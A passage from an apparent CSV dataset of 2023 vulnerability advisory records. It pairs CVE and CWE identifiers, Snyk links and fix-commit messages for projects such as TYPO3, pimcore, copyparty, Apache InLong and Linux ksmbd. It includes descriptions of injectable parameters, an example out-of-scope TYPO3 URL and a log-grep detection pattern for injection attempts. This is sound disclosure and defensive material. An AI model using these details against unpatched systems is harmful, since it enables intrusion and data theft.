Affected versions of this package are vulnerable to Unchecked Return Value such that the ecrecover precompile does not fill the output buffer if the signature does not verify. However, the ecrecover builtin will still return whatever is at memory location 0. This means that if the compiler has been convinced to write to the 0 memory location with specially crafted data (generally, this can happen with a hashmap access or immutable read) just before the ecrecover, a signature check might pass on an invalid signature.",2023
CVE-2023-34434,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHEINLONG-5805382,26/07/2023,25/07/2023,https://github.com/apache/inlong/commit/34835f827771074345f42a9b1658d018f202516e,Deserialization of Untrusted Data,https://api.github.com/repos/apache/inlong/commits/34835f827771074345f42a9b1658d018f202516e,Hao,1780095+hnrainll@users.noreply.github.com,inlong,34835f827771074345f42a9b1658d018f202516e,[INLONG-8129][Manager] Add encoding check to the MySQL JDBC URL (#8130),Java,8.1,high,"Affected versions of this package are vulnerable to Deserialization of Untrusted Data due to improper encoding check to the MySQL JDBC URL and improper validation of the allowLoadLocalInfile, allowUrlInLocalInfile, allowLoadLocalInfileInPath parameters.
The attacker could bypass the current logic and achieve arbitrary file reading.",2023
CVE-2023-38496,CWE-271,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMAPPTAINERAPPTAINERINTERNALPKGUTILPRIV-5805380,26/07/2023,26/07/2023,https://github.com/apptainer/apptainer/commit/342071479d776e9a6fe57963e79763cb56fa2654,Privilege Dropping / Lowering Errors,https://api.github.com/repos/apptainer/apptainer/commits/342071479d776e9a6fe57963e79763cb56fa2654,DrDaveD,2129743+DrDaveD@users.noreply.github.com,apptainer,342071479d776e9a6fe57963e79763cb56fa2654,"Merge pull request #1579 from cclerget/pick-issue-1576

Restore old syscall setresuid behavior when escalating/dropping privileges. (release-1.2)",Markdown,6.1,medium,"Affected versions of this package are vulnerable to Privilege Dropping / Lowering Errors when requesting container network setup, therefore subsequent functions are called with root privileges, the attack surface is rather limited for users, but an attacker could possibly craft a starter config to delete any directory on the host filesystems.",2023
CVE-2023-38496,CWE-271,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMAPPTAINERAPPTAINERINTERNALPKGRUNTIMEENGINE-5805381,26/07/2023,26/07/2023,https://github.com/apptainer/apptainer/commit/342071479d776e9a6fe57963e79763cb56fa2654,Privilege Dropping / Lowering Errors,https://api.github.com/repos/apptainer/apptainer/commits/342071479d776e9a6fe57963e79763cb56fa2654,DrDaveD,2129743+DrDaveD@users.noreply.github.com,apptainer,342071479d776e9a6fe57963e79763cb56fa2654,"Merge pull request #1579 from cclerget/pick-issue-1576

Restore old syscall setresuid behavior when escalating/dropping privileges. (release-1.2)",Markdown,6.1,medium,"Affected versions of this package are vulnerable to Privilege Dropping / Lowering Errors when requesting container network setup, therefore subsequent functions are called with root privileges, the attack surface is rather limited for users, but an attacker could possibly craft a starter config to delete any directory on the host filesystems.",2023
CVE-2023-35088,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHEINLONG-5805375,26/07/2023,25/07/2023,https://github.com/apache/inlong/commit/cab63a8eea6c0f4bf3d30ce245b7e1beee42504d,SQL Injection,https://api.github.com/repos/apache/inlong/commits/cab63a8eea6c0f4bf3d30ce245b7e1beee42504d,Hao,1780095+hnrainll@users.noreply.github.com,inlong,cab63a8eea6c0f4bf3d30ce245b7e1beee42504d,[INLONG-8197][Manager] Optimize the ClickHouse query for the Audit interface (#8198),Java,8.3,high,"Affected versions of this package are vulnerable to SQL Injection in the toAuditCkSql() method in AuditServiceImpl.java, which is accessible via the audit endpoint. The groupId, streamId, auditId, and dt parameters are concatenated unchecked into an SQL query.",2023
CVE-2023-38500,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-TYPO3HTMLSANITIZER-5805374,26/07/2023,26/07/2023,https://github.com/TYPO3/html-sanitizer/commit/e3026f589fef0be8c3574ee3f0a0bfbe33d7ebdb,Cross-site Scripting (XSS),https://api.github.com/repos/TYPO3/html-sanitizer/commits/e3026f589fef0be8c3574ee3f0a0bfbe33d7ebdb,Oliver Hader,oliver@typo3.org,html-sanitizer,e3026f589fef0be8c3574ee3f0a0bfbe33d7ebdb,"Merge pull request from GHSA-59jf-3q9v-rh6g

* [SECURITY] Properly encode noscript child nodes

The `<noscript>` element has a special behavior when
being evaluated in browsers, which depends on whether
script-parsing is enabled or disabled.

As a consequence this change will

* encode comment inner data, e.g. `<!-- <""comment""> -->`
  as `<!-- &lt;&quot;comment&quot;&gt -->`
* always encode tag attributes, e.g. `<p id=""<value>"">`
  as `<p id=""&lt;value&gt;"">`
* extend `Comment` and `CdataSection` to have a constructor
  (which triggers encoding per default) and to implement the
  `Behavior\HandlerInterface`
* add a new serializer option `encode_attributes`, which might
  basically be extracted to `Masterminds\HTML5`

* [TASK] Ensure attribute serialization preserves values as is

We don't want so called double-encoding – which is a valid
usecase when HTML describes how HTML is to be written – to
be automagically transformed to single encoded values,
as otherwise a valid input like

<a title=""Insert &amp;amp; to write an &amp;""></a>
(Browser would show ""Insert &amp; to write an &"")

…would be changed to:

<a title=""Insert &amp; to write an &amp;""></a>
(Browser would show ""Insert & to write an &"")

Also add tests for the attribute encoding we want:
 * Encode quotes, tags and stuff that might cause security issues
 * do not encode unnecessarily encode slashes or colons
   (like htmlentitites would do)

---------

Co-authored-by: Benjamin Franzke <ben@bnf.dev>",PHP,4.7,medium,"Affected versions of this package are vulnerable to Cross-site Scripting (XSS). Due to an encoding issue in the serialization layer, malicious markup nested in a noscript element is not encoded correctly. noscript is disabled in the default configuration, but might have been enabled in custom scenarios. This allows bypassing the cross-site scripting mechanism of TYPO3 HTML Sanitizer.",2023
CVE-2023-38435,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHEFELIX-5805376,26/07/2023,26/07/2023,https://github.com/apache/felix-dev/commit/c4e67520e0a4499389342491869919a6c42ed62c,Cross-site Scripting (XSS),https://api.github.com/repos/apache/felix-dev/commits/c4e67520e0a4499389342491869919a6c42ed62c,Carsten Ziegeler,cziegeler@apache.org,felix-dev,c4e67520e0a4499389342491869919a6c42ed62c,FELIX-6617 : Properly encode web output,Unknown,6.1,medium,Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user input sanitization in the Healthcheck Webconsole plugin,2023
CVE-2023-36806,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-CONTAOCOREBUNDLE-5805373,26/07/2023,25/07/2023,https://github.com/contao/contao/commit/5c9aff32cfc1f7dc452a045862ac2f86a6b9b4b4,Cross-site Scripting (XSS),https://api.github.com/repos/contao/contao/commits/5c9aff32cfc1f7dc452a045862ac2f86a6b9b4b4,Martin Auswöger,martin@auswoeger.com,contao,5c9aff32cfc1f7dc452a045862ac2f86a6b9b4b4,Merge pull request from GHSA-4gpr-p634-922x,PHP,6.6,medium,"contao/core-bundle is an Open Source PHP Content Management System for people who want a professional website that is easy to maintain.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user input sanitization via input unit widget.
Exploiting this vulnerability is possible when authenticated users inject malicious code in widgets with units, which is executed both in the element preview (back end) and on the website (front end).",2023
CVE-2023-38499,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PHP-TYPO3CMS-5805379,26/07/2023,25/07/2023,https://github.com/TYPO3/typo3/commit/71e2d04ee8e786d3deb8dfa2c323e571e19c95e9,Information Exposure,https://api.github.com/repos/TYPO3/typo3/commits/71e2d04ee8e786d3deb8dfa2c323e571e19c95e9,Oliver Hader,oliver@typo3.org,typo3,71e2d04ee8e786d3deb8dfa2c323e571e19c95e9,"[SECURITY] Avoid out-of-scope page access for non-matching site

This change disallows calling an URI with page-id query parameters
that are not part of a particular site - for instance the following
URL `https://example.org/?id=3000&L=0` has two aspects:

* the site `example.org` has the root page-id 1000
* the site `internal.example.org` has the root page-id 3000

The example above allows to call a page-id for an internal site,
by using a valid and public entry point.

The new feature flag
`security.frontend.allowInsecureSiteResolutionByQueryParameters`
allows to control this behavior for backward compatibility reasons.
Per default `allowInsecureSiteResolutionByQueryParameters` is disabled.

Resolves: #100889
Releases: main, 12.4, 11.5
Change-Id: I88d565b5d9bea556b4f754c3069d56124cea98bd
Security-Bulletin: TYPO3-CORE-SA-2023-003
Security-References: CVE-2023-38499
Reviewed-on: https://review.typo3.org/c/Packages/TYPO3.CMS/+/80156
Tested-by: Oliver Hader <oliver.hader@typo3.org>
Reviewed-by: Oliver Hader <oliver.hader@typo3.org>",PHP,3.7,low,"typo3/cms is a free open source Content Management Framework.
Affected versions of this package are vulnerable to Information Exposure to sites that do not share a base URL with the current site. In multi-site scenarios, enumerating the HTTP query parameters id and L allows access to out-of-scope rendered content in the website frontend. For instance, this allows visitors to access content of an internal site by manipulating query parameters to the URL.
NOTE: The maintainers have indicated that exploit code for this vulnerability is available.",2023
CVE-2023-38499,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PHP-TYPO3CMS-5805371,26/07/2023,26/07/2023,https://github.com/TYPO3/typo3/commit/702e2debd4b28f9cdb540544565fe6a8627ccb6a,Information Exposure,https://api.github.com/repos/TYPO3/typo3/commits/702e2debd4b28f9cdb540544565fe6a8627ccb6a,Oliver Hader,oliver@typo3.org,typo3,702e2debd4b28f9cdb540544565fe6a8627ccb6a,"[SECURITY] Avoid out-of-scope page access for non-matching site

This change disallows calling an URI with page-id query parameters
that are not part of a particular site - for instance the following
URL `https://example.org/?id=3000&L=0` has two aspects:

* the site `example.org` has the root page-id 1000
* the site `internal.example.org` has the root page-id 3000

The example above allows to call a page-id for an internal site,
by using a valid and public entry point.

The new feature flag
`security.frontend.allowInsecureSiteResolutionByQueryParameters`
allows to control this behavior for backward compatibility reasons.
Per default `allowInsecureSiteResolutionByQueryParameters` is disabled.

Resolves: #100889
Releases: main, 12.4, 11.5
Change-Id: I88d565b5d9bea556b4f754c3069d56124cea98bd
Security-Bulletin: TYPO3-CORE-SA-2023-003
Security-References: CVE-2023-38499
Reviewed-on: https://review.typo3.org/c/Packages/TYPO3.CMS/+/80159
Tested-by: Oliver Hader <oliver.hader@typo3.org>
Reviewed-by: Oliver Hader <oliver.hader@typo3.org>",PHP,3.7,low,"typo3/cms is a free open source Content Management Framework.
Affected versions of this package are vulnerable to Information Exposure such that, in multi-site scenarios, enumerating the HTTP query parameters id and L allows out-of-scope access to rendered content in the website frontend. This allows visitors to access content of an internal site by adding handcrafted query parameters to the URL of a site that was publicly available.",2023
CVE-2023-38501,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-COPYPARTY-5805368,26/07/2023,26/07/2023,https://github.com/9001/copyparty/commit/007d948cb982daa05bc6619cd20ee55b7e834c38,Cross-site Scripting (XSS),https://api.github.com/repos/9001/copyparty/commits/007d948cb982daa05bc6619cd20ee55b7e834c38,ed,s@ocv.me,copyparty,007d948cb982daa05bc6619cd20ee55b7e834c38,"fix GHSA-f54q-j679-p9hh: reflected-XSS in cookie-setters;
it was possible to set cookie values which contained newlines,
thus terminating the http header and bleeding into the body.

We now disallow control-characters in queries,
but still allow them in paths, as copyparty supports
filenames containing newlines and other mojibake.

The changes in `set_k304` are not necessary in fixing the vulnerability,
but makes the behavior more correct.",Python,6.3,medium,"Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization via URL-parameter ?k304=... and ?setck=.... An attacker might be able to move or delete existing files on the server, or upload new files, using the account of the person who clicks the malicious link. 
Note:
It is recommended to change account passwords unless log inspection did not produce any trace of attacks.
IoCs:
(gzip -dc access.log*.gz; cat access.log) | sed -r 's/"" [0-9]+ .*//' | grep -iE '%0[da]%0[da]%0[da]%0[da]|[?&](hc|pw)=.*[<>]'",2023
CVE-2018-17031,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GOGSIOGOGSINTERNALASSETS-5805365,26/07/2023,14/05/2022,https://github.com/gogs/gogs/commit/e14b6abf9dae13bc087c9d9db8fe7c7a5125c792,Cross-site Scripting (XSS),https://api.github.com/repos/gogs/gogs/commits/e14b6abf9dae13bc087c9d9db8fe7c7a5125c792,ᴜɴᴋɴᴡᴏɴ,u@gogs.io,gogs,e14b6abf9dae13bc087c9d9db8fe7c7a5125c792,http: always set header `X-Content-Type-Options` to `nosniff` (#6008),Markdown,6.1,medium,"gogs.io/gogs/internal/assets is a painless self-hosted Git service
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) by using a crafted .eml file to trigger MIME-type sniffing. Exploiting this vulnerability is possible because an X-Content-Type-Options: nosniff header is not sent.",2023
CVE-2018-17031,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOGSGOGSINTERNALCONTEXT-5805366,26/07/2023,14/05/2022,https://github.com/gogs/gogs/commit/e14b6abf9dae13bc087c9d9db8fe7c7a5125c792,Cross-site Scripting (XSS),https://api.github.com/repos/gogs/gogs/commits/e14b6abf9dae13bc087c9d9db8fe7c7a5125c792,ᴜɴᴋɴᴡᴏɴ,u@gogs.io,gogs,e14b6abf9dae13bc087c9d9db8fe7c7a5125c792,http: always set header `X-Content-Type-Options` to `nosniff` (#6008),Markdown,6.1,medium,Affected versions of this package are vulnerable to Cross-site Scripting (XSS) by using a crafted .eml file to trigger MIME-type sniffing. Exploiting this vulnerability is possible because an X-Content-Type-Options: nosniff header is not sent.,2023
CVE-2018-17031,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GOGSIOGOGSINTERNALCONTEXT-5805367,26/07/2023,14/05/2022,https://github.com/gogs/gogs/commit/e14b6abf9dae13bc087c9d9db8fe7c7a5125c792,Cross-site Scripting (XSS),https://api.github.com/repos/gogs/gogs/commits/e14b6abf9dae13bc087c9d9db8fe7c7a5125c792,ᴜɴᴋɴᴡᴏɴ,u@gogs.io,gogs,e14b6abf9dae13bc087c9d9db8fe7c7a5125c792,http: always set header `X-Content-Type-Options` to `nosniff` (#6008),Markdown,6.1,medium,Affected versions of this package are vulnerable to Cross-site Scripting (XSS) by using a crafted .eml file to trigger MIME-type sniffing. Exploiting this vulnerability is possible because an X-Content-Type-Options: nosniff header is not sent.,2023
CVE-2019-14993,CWE-185,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMISTIOISTIO-5805363,26/07/2023,24/05/2022,https://github.com/istio/istio/commit/92d121c9b8859ca75ca55e8c4caa9bb7d40a514a,Incorrect Regular Expression,https://api.github.com/repos/istio/istio/commits/92d121c9b8859ca75ca55e8c4caa9bb7d40a514a,Piotr Sikora,piotrsikora@google.com,istio,92d121c9b8859ca75ca55e8c4caa9bb7d40a514a,"Install libc++ in Proxy's Docker images.

Signed-off-by: Piotr Sikora <piotrsikora@google.com>",Unknown,5.3,medium,"github.com/istio/istio is an open platform to connect, manage, and secure microservices.
Affected versions of this package are vulnerable to Incorrect Regular Expression due to improper handling of regular expressions for long URIs.
This vulnerability can be exploited during use of the JWT, VirtualService, HTTPAPISpecBinding, or QuotaSpecBinding API.",2023
CVE-2019-14993,CWE-185,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-ISTIOIOISTIO-5805364,26/07/2023,24/05/2022,https://github.com/istio/istio/commit/92d121c9b8859ca75ca55e8c4caa9bb7d40a514a,Incorrect Regular Expression,https://api.github.com/repos/istio/istio/commits/92d121c9b8859ca75ca55e8c4caa9bb7d40a514a,Piotr Sikora,piotrsikora@google.com,istio,92d121c9b8859ca75ca55e8c4caa9bb7d40a514a,"Install libc++ in Proxy's Docker images.

Signed-off-by: Piotr Sikora <piotrsikora@google.com>",Unknown,5.3,medium,"istio.io/istio is an open platform to connect, manage, and secure microservices.
Affected versions of this package are vulnerable to Incorrect Regular Expression due to improper handling of regular expressions for long URIs.
This vulnerability can be exploited during use of the JWT, VirtualService, HTTPAPISpecBinding, or QuotaSpecBinding API.",2023
CVE-2018-10894,CWE-295,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGKEYCLOAK-5803002,23/07/2023,13/05/2022,https://github.com/keycloak/keycloak/commit/812e76c39b1e693e8f11e5549cca2c90631f372e,Access Restriction Bypass,https://api.github.com/repos/keycloak/keycloak/commits/812e76c39b1e693e8f11e5549cca2c90631f372e,Hynek Mlnarik,hmlnarik@redhat.com,keycloak,812e76c39b1e693e8f11e5549cca2c90631f372e,KEYCLOAK-8163 Improve SAML validations,Java,5.4,medium,"org.keycloak:keycloak-services is an open source identity and access management solution for modern applications and services.
Affected versions of this package are vulnerable to Access Restriction Bypass via SAML authentication that incorrectly authenticated expired certificates. A malicious user can use this to access unauthorized data or possibly conduct further attacks.",2023
CVE-2023-3822,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-5803008,23/07/2023,21/07/2023,https://github.com/pimcore/pimcore/commit/d75888a9b14baaad591548463cca09dfd1395236,Cross-site Scripting (XSS),https://api.github.com/repos/pimcore/pimcore/commits/d75888a9b14baaad591548463cca09dfd1395236,aryaantony92,arya.antony@pimcore.com,pimcore,d75888a9b14baaad591548463cca09dfd1395236,Fix Xss in the link Editable,JavaScript,6.0,medium,"pimcore/pimcore is a content & product management framework (CMS/PIM/E-Commerce).
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via the text section in the Edit section.",2023
CVE-2023-3820,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-5803009,23/07/2023,22/07/2023,https://github.com/pimcore/pimcore/commit/e641968979d4a2377bbea5e2a76bdede040d0b97,SQL Injection,https://api.github.com/repos/pimcore/pimcore/commits/e641968979d4a2377bbea5e2a76bdede040d0b97,JiaJia Ji,kingjia90@gmail.com,pimcore,e641968979d4a2377bbea5e2a76bdede040d0b97,"[Bug]: Quote sorting key (#15523)

* quote sorting key

* add quoting to order key with `?` case too

* refactor, no need to get Db

* break line to fix codesmell

* improve spacing

* remove trailing space",PHP,7.2,high,"pimcore/pimcore is a content & product management framework (CMS/PIM/E-Commerce).
Affected versions of this package are vulnerable to SQL Injection due to some SQL exploitation tools such as sqlmap.",2023
CVE-2023-3821,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-5803010,23/07/2023,21/07/2023,https://github.com/pimcore/pimcore/commit/92811f07d39e4ad95c92003868f5f7309489d79c,Cross-site Scripting (XSS),https://api.github.com/repos/pimcore/pimcore/commits/92811f07d39e4ad95c92003868f5f7309489d79c,aryaantony92,arya.antony@pimcore.com,pimcore,92811f07d39e4ad95c92003868f5f7309489d79c,Fix Xss in the Search Documents,JavaScript,6.1,medium,"pimcore/pimcore is a content & product management framework (CMS/PIM/E-Commerce).
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) in the Search Documents",2023
CVE-2018-10894,CWE-295,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGKEYCLOAK-5803007,23/07/2023,13/05/2022,https://github.com/keycloak/keycloak/commit/812e76c39b1e693e8f11e5549cca2c90631f372e,Access Restriction Bypass,https://api.github.com/repos/keycloak/keycloak/commits/812e76c39b1e693e8f11e5549cca2c90631f372e,Hynek Mlnarik,hmlnarik@redhat.com,keycloak,812e76c39b1e693e8f11e5549cca2c90631f372e,KEYCLOAK-8163 Improve SAML validations,Java,5.4,medium,Affected versions of this package are vulnerable to Access Restriction Bypass via SAML authentication that incorrectly authenticated expired certificates. A malicious user can use this to access unauthorized data or possibly conduct further attacks.,2023
CVE-2018-1000207,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MODXREVOLUTION-5803006,23/07/2023,13/05/2022,https://github.com/modxcms/revolution/commit/06bc94257408f6a575de20ddb955aca505ef6e68,Access Restriction Bypass,https://api.github.com/repos/modxcms/revolution/commits/06bc94257408f6a575de20ddb955aca505ef6e68,Ivan Klimchuk,ivan.klimchuk@1pt.com,revolution,06bc94257408f6a575de20ddb955aca505ef6e68,"Filtering user parameters before passing them into phpthumb class #13979

* upstream/pr/13979:
  Added strict mode for in_array
  Returns the missed in the past the considering to phpthumb_imagemagick_path system setting
  Limit parameters incoming from users to only allowed from phpthumb
  Some code cleanup before fix",Unknown,7.2,high,"modx/revolution is a Content Management System.
Affected versions of this package are vulnerable to Access Restriction Bypass in Filtering user parameters before passing them into phpthumb class. This can result in Creating a file with a custom filename and content. This is exploitable via Web request.",2023
CVE-2022-30858,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-MINIUPNPNGIFLIB-5798566,21/07/2023,21/07/2023,https://github.com/miniupnp/ngiflib/commit/231df822d2ec2096d4ccf8d0b9e6a9c6bbfd3b69,Denial of Service (DoS),https://api.github.com/repos/miniupnp/ngiflib/commits/231df822d2ec2096d4ccf8d0b9e6a9c6bbfd3b69,Thomas Bernard,miniupnp@free.fr,ngiflib,231df822d2ec2096d4ccf8d0b9e6a9c6bbfd3b69,"ngiflibSDL.c: do not coredump on GIF without any palette

fixes #22",Unknown,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS) via the SDL_LoadAnimatedGif method.,2023
CVE-2023-22043,CWE-446,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGOPENJFX-5788302,23/07/2023,19/07/2023,https://github.com/openjdk/jfx/commit/67c55e51e063d2f9e291ae8dc4877843fa51119c,UI Discrepancy for Security Feature,https://api.github.com/repos/openjdk/jfx/commits/67c55e51e063d2f9e291ae8dc4877843fa51119c,Kevin Rushforth,kcr@openjdk.org,jfx,67c55e51e063d2f9e291ae8dc4877843fa51119c,"8251862: Wrong position of Popup windows at the intersection of 2 screens

Reviewed-by: aghaisas, arapte",Java,5.9,medium,"Affected versions of this package are vulnerable to UI Discrepancy for Security Feature in the javafx/graphics component.
Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g. code installed by an administrator).",2023
CVE-2023-3724,CWE-330,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-WOLFSSLWOLFSSL-5798564,21/07/2023,21/07/2023,https://github.com/wolfSSL/wolfssl/commit/00f1eddee429ff51390b20caadd2eb6afe51e1aa,Insecure Randomness,https://api.github.com/repos/wolfSSL/wolfssl/commits/00f1eddee429ff51390b20caadd2eb6afe51e1aa,JacobBarthelmeh,jacob@wolfssl.com,wolfssl,00f1eddee429ff51390b20caadd2eb6afe51e1aa,add tls extension sanity check,C/C++,9.1,critical,"Affected versions of this package are vulnerable to Insecure Randomness. If a TLS 1.3 client gets neither a PSK (pre shared key) extension nor a KSE (key share extension) when connecting to a malicious server, a default predictable buffer gets used for the IKM (Input Keying Material) value when generating the session master secret. Using a potentially known IKM value when generating the session master secret key compromises the key generated, allowing an eavesdropper to reconstruct it and potentially allowing access to or meddling with message contents in the session. 
Note:
This issue does not affect client validation of connected servers, nor expose private key information, but could result in an insecure TLS 1.3 session when not controlling both sides of the connection.",2023
CVE-2023-38409,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5798563,21/07/2023,21/07/2023,https://github.com/torvalds/linux/commit/fffb0b52d5258554c645c966c6cbef7de50b851d,Denial of Service (DoS),https://api.github.com/repos/torvalds/linux/commits/fffb0b52d5258554c645c966c6cbef7de50b851d,Daniel Vetter,daniel.vetter@ffwll.ch,linux,fffb0b52d5258554c645c966c6cbef7de50b851d,"fbcon: set_con2fb_map needs to set con2fb_map!

I got really badly confused in d443d9386472 (""fbcon: move more common
code into fb_open()"") because we set the con2fb_map before the failure
points, which didn't look good.

But in trying to fix that I moved the assignment into the wrong path -
we need to do it for _all_ vc we take over, not just the first one
(which additionally requires the call to con2fb_acquire_newinfo).

I've figured this out because of a KASAN bug report, where the
fbcon_registered_fb and fbcon_display arrays went out of sync in
fbcon_mode_deleted() because the con2fb_map pointed at the old
fb_info, but the modes and everything was updated for the new one.

Signed-off-by: Daniel Vetter <daniel.vetter@intel.com>
Reviewed-by: Javier Martinez Canillas <javierm@redhat.com>
Acked-by: Helge Deller <deller@gmx.de>
Tested-by: Xingyuan Mo <hdthky0@gmail.com>
Fixes: d443d9386472 (""fbcon: move more common code into fb_open()"")
Reported-by: Xingyuan Mo <hdthky0@gmail.com>
Cc: Thomas Zimmermann <tzimmermann@suse.de>
Cc: Sam Ravnborg <sam@ravnborg.org>
Cc: Xingyuan Mo <hdthky0@gmail.com>
Cc: Thomas Zimmermann <tzimmermann@suse.de>
Cc: Helge Deller <deller@gmx.de>
Cc: <stable@vger.kernel.org> # v5.19+",C/C++,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS). Because an assignment occurs only for the first vc, the fbcon_registered_fb and fbcon_display arrays can be desynchronized in fbcon_mode_deleted (the con2fb_map points at the old fb_info).",2023
CVE-2023-38432,CWE-125,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5798562,21/07/2023,21/07/2023,https://github.com/torvalds/linux/commit/2b9b8f3b68edb3d67d79962f02e26dbb5ae3808d,Out-of-bounds Read,https://api.github.com/repos/torvalds/linux/commits/2b9b8f3b68edb3d67d79962f02e26dbb5ae3808d,Namjae Jeon,linkinjeon@kernel.org,linux,2b9b8f3b68edb3d67d79962f02e26dbb5ae3808d,"ksmbd: validate command payload size

->StructureSize2 indicates command payload size. ksmbd should validate
this size with rfc1002 length before accessing it.
This patch remove unneeded check and add the validation for this.

[    8.912583] BUG: KASAN: slab-out-of-bounds in ksmbd_smb2_check_message+0x12a/0xc50
[    8.913051] Read of size 2 at addr ffff88800ac7d92c by task kworker/0:0/7
...
[    8.914967] Call Trace:
[    8.915126]  <TASK>
[    8.915267]  dump_stack_lvl+0x33/0x50
[    8.915506]  print_report+0xcc/0x620
[    8.916558]  kasan_report+0xae/0xe0
[    8.917080]  kasan_check_range+0x35/0x1b0
[    8.917334]  ksmbd_smb2_check_message+0x12a/0xc50
[    8.917935]  ksmbd_verify_smb_message+0xae/0xd0
[    8.918223]  handle_ksmbd_work+0x192/0x820
[    8.918478]  process_one_work+0x419/0x760
[    8.918727]  worker_thread+0x2a2/0x6f0
[    8.919222]  kthread+0x187/0x1d0
[    8.919723]  ret_from_fork+0x1f/0x30
[    8.919954]  </TASK>

Cc: stable@vger.kernel.org
Reported-by: Chih-Yen Chang <cc85nod@gmail.com>
Signed-off-by: Namjae Jeon <linkinjeon@kernel.org>
Signed-off-by: Steve French <stfrench@microsoft.com>",C/C++,8.2,high,Affected versions of this package are vulnerable to Out-of-bounds Read due to not validating the relationship between the command payload size and the RFC1002 length specification.,2023
CVE-2023-38430,CWE-125,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5798561,21/07/2023,21/07/2023,https://github.com/torvalds/linux/commit/1c1bcf2d3ea061613119b534f57507c377df20f9,Out-of-bounds Read,https://api.github.com/repos/torvalds/linux/commits/1c1bcf2d3ea061613119b534f57507c377df20f9,Namjae Jeon,linkinjeon@kernel.org,linux,1c1bcf2d3ea061613119b534f57507c377df20f9,"ksmbd: validate smb request protocol id

This patch add the validation for smb request protocol id.
If it is not one of the four ids(SMB1_PROTO_NUMBER, SMB2_PROTO_NUMBER,
SMB2_TRANSFORM_PROTO_NUM, SMB2_COMPRESSION_TRANSFORM_ID), don't allow
processing the request. And this will fix the following KASAN warning
also.

[   13.905265] BUG: KASAN: slab-out-of-bounds in init_smb2_rsp_hdr+0x1b9/0x1f0
[   13.905900] Read of size 16 at addr ffff888005fd2f34 by task kworker/0:2/44
...
[   13.908553] Call Trace:
[   13.908793]  <TASK>
[   13.908995]  dump_stack_lvl+0x33/0x50
[   13.909369]  print_report+0xcc/0x620
[   13.910870]  kasan_report+0xae/0xe0
[   13.911519]  kasan_check_range+0x35/0x1b0
[   13.911796]  init_smb2_rsp_hdr+0x1b9/0x1f0
[   13.912492]  handle_ksmbd_work+0xe5/0x820

Cc: stable@vger.kernel.org
Reported-by: Chih-Yen Chang <cc85nod@gmail.com>
Signed-off-by: Namjae Jeon <linkinjeon@kernel.org>
Signed-off-by: Steve French <stfrench@microsoft.com>",C/C++,8.2,high,Affected versions of this package are vulnerable to Out-of-bounds Read due to not validating the SMB request protocol ID.,2023
CVE-2023-38427,CWE-125,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5798559,21/07/2023,21/07/2023,https://github.com/torvalds/linux/commit/f1a411873c85b642f13b01f21b534c2bab81fc1b,Out-of-bounds Read,https://api.github.com/repos/torvalds/linux/commits/f1a411873c85b642f13b01f21b534c2bab81fc1b,Namjae Jeon,linkinjeon@kernel.org,linux,f1a411873c85b642f13b01f21b534c2bab81fc1b,"ksmbd: fix out-of-bound read in deassemble_neg_contexts()

The check in the beginning is
`clen + sizeof(struct smb2_neg_context) <= len_of_ctxts`,
but in the end of loop, `len_of_ctxts` will subtract
`((clen + 7) & ~0x7) + sizeof(struct smb2_neg_context)`, which causes
integer underflow when clen does the 8 alignment. We should use
`(clen + 7) & ~0x7` in the check to avoid underflow from happening.

Then there are some variables that need to be declared unsigned
instead of signed.

[   11.671070] BUG: KASAN: slab-out-of-bounds in smb2_handle_negotiate+0x799/0x1610
[   11.671533] Read of size 2 at addr ffff888005e86cf2 by task kworker/0:0/7
...
[   11.673383] Call Trace:
[   11.673541]  <TASK>
[   11.673679]  dump_stack_lvl+0x33/0x50
[   11.673913]  print_report+0xcc/0x620
[   11.674671]  kasan_report+0xae/0xe0
[   11.675171]  kasan_check_range+0x35/0x1b0
[   11.675412]  smb2_handle_negotiate+0x799/0x1610
[   11.676217]  ksmbd_smb_negotiate_common+0x526/0x770
[   11.676795]  handle_ksmbd_work+0x274/0x810
...

Cc: stable@vger.kernel.org
Signed-off-by: Chih-Yen Chang <cc85nod@gmail.com>
